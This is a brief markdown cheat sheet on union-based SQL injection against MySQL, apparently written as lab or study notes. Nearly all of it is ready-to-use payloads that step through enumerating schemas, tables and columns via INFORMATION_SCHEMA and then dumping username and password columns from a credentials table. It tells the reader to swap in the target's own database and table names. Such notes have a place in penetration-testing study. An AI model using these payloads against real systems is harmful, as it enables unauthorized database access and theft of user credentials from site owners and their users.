# sql-injection

### Union Base SQL Injection
##### Schema,Schemata check

      mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

#### Step 1: Schema/Database check

     cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

#### Step 2: Tables check

      cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

Here , dev is database name which will replace to your target database name

#### Step3: Columns check

      cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

Here , credentials is table name whick will replace to your target table name

#### Step4: Dum Data from table:

      cn' UNION select 1, username, password, 4 from dev.credentials-- -

Where username and password are column name , dev is database name , credentials is table name

